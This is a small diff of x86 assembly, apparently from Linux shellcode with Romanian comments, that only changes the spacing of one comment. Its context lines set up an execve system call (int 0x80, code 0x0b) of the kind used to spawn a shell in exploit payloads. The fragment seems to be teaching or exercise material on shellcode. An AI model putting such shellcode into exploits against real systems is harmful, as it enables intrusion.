@@ -13,7 +13,7 @@ section .text
 		mov [ebx+8], ebx    ;octetii AAAA vor fi inlocuiti cu adresa sirului
 		mov [ebx+12], eax   ;octetii BBBB vor fi inlocuiti cu 0000
 		lea ecx, [ebx+8]    ;se incarca registru ecx cu adresa sirului 
-		xor edx, edx        ; nu exista variabile de mediu
+		xor edx, edx        ;nu exista variabile de mediu
 		mov al,  0x0b       ;se pune codul instructiunii execve
 		int 0x80            ;se face apelul functiei execve
      two:
